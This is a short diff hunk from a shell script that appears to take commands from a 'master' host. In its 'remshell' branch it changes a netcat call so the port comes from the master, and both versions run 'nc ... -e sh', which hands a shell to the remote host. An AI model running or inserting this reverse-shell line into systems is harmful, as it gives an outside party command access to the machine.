@@ -127,7 +127,8 @@ do
         break
     	;;
     remshell)
-	nc $master 6789 -e sh
+	localport="`recv`"
+	nc $master $localport -e sh
 	send "IS_REMSHELL"
 	break
 	;;
